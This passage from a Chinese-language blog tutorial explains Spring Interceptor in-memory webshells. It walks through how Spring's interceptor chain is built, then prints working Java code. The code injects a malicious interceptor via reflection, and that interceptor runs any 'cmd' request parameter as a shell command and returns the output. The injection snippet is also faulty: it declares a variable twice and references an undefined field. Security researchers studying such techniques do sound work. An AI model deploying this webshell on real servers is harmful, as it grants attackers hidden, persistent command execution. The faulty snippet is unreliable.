class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="FVPWx">SpringInterceptor内存马</h2>

<p>Interceptor和Tomcat中的Filter过滤器很相似，但是还是有些差别。一般来说，Interceptor用来做日志记录，过滤器则用来拦截非法操作。</p>
<h3 id="pUTk6">源码分析</h3>
<h4 id="QIhiv">Interceptor流程分析</h4>

<p>在<code>doDispatch</code>方法中，调用<code>mppedHandler.applyPreHandle</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754404942092-afd0bf02-041c-47f4-b6f8-45ebc3971886.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754404942092-afd0bf02-041c-47f4-b6f8-45ebc3971886.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>applyPreHandle</code>，可以看到里面遍历调用了interceptor的<code>preHande</code>方法，如果其中有拦截器返回false，就会return</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754405041337-1f5538bc-eb62-4145-bbe2-1720d978e625.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754405041337-1f5538bc-eb62-4145-bbe2-1720d978e625.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里从别的师傅那里，拿来一张图，该图展现了Filter、Controller、Interceptor中方法的执行顺序</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754405155169-48327f82-54e2-4c42-98fb-56ca7fd1fd4d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754405155169-48327f82-54e2-4c42-98fb-56ca7fd1fd4d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="fQXWJ">Interceptor注册流程</h4>

<p>下断点在<code>DispathcerServlet.doDispatch</code>方法中，持续跟进<code>getHandler</code>方法，在该方法中调用了<code>getHandlerExecutionChain</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754404569207-7123c5fc-f437-4625-80f5-44019dfaa156.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754404569207-7123c5fc-f437-4625-80f5-44019dfaa156.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>getHandlerExecutionChain</code>，该方法遍历取出<code>adapedInterceptor</code>中的<code>Intercepter</code>，如果该interceptor符合条件，就添加到chain中（和Tomcat中的FilterChain也是比较像的）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754404815583-9df7e8b0-4737-4cbf-8957-e64b346c8520.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1754404815583-9df7e8b0-4737-4cbf-8957-e64b346c8520.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="jXcyK">注册Interceptor</h3>
<h4 id="FUS3K">获取上下文</h4>

<p>获取上下文在上面的Controller内存马已经说过了，这里就不再赘述</p>
<h4 id="TMVYH">获取RequestMappingHandlerMapping</h4>

<p>在<code>AbstractHandlerMappiing</code>类中，通过<code>addInterceptor</code>将拦截器添加至chain中。但该类为抽象类，如果遇到抽象类，那么我们应该去找他的实现类<code>RequestMappingHandler</code></p>
<p>同样的<code>RequestMappingHandlerMapping</code>可以通过<code>getBean</code>方法从上下文中获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure>

<h4 id="BEUAK">注册Interceptor</h4>

<p>前面在Interceptor注册流程中分析到过，直接通过调用<code>adaptedInterceptors</code>的<code>add</code>方法添加即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TestInterceptor evilInterceptor=<span class="keyword">new</span> <span class="title class_">TestInterceptor</span>();</span><br><span class="line">adtedinterceptors.add(evilInterceptor);</span><br></pre></td></tr></table></figure>

<h3 id="kk379">完整测试代码</h3>

<p>完整测试代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.stoocea.Interceptor.TestInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.ContextLoader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil2Controller</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/evil&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEvilInterceptor</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        WebApplicationContext applicationContext=(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)field.get(<span class="literal">null</span>)).iterator().next();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过ContextLoader.getCurrentWebApplicationContext() 来获取上下文</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过IOC容器get到AbstractHandlerMapping</span></span><br><span class="line">        AbstractHandlerMapping handlerMapping=applicationContext.getBean(<span class="string">&quot;requestMappingHandlerMapping&quot;</span>, AbstractHandlerMapping.class);</span><br><span class="line">        <span class="comment">//反射获取adaptedInterceptors</span></span><br><span class="line">        Field field1=AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ArrayList&lt;Object&gt; adtedinterceptors =(ArrayList&lt;Object&gt;)field1.get(handlerMapping);</span><br><span class="line">        <span class="comment">//注册Interceptor</span></span><br><span class="line">        TestInterceptor evilInterceptor=<span class="keyword">new</span> <span class="title class_">TestInterceptor</span>();</span><br><span class="line">        adtedinterceptors.add(evilInterceptor);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;inject sucessfully&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>恶意的Interceptor如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span>  <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="GgEsr">小结</h2>

<p>不论是学习Tomcat内存马，还是Spring内存马的过程中，都能感觉到能够更好的理解其底层的原理，能够创造出天才的真是Tomcat和Spring！！！</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>memShell</tag>
      </tags>
  </entry>
</search>
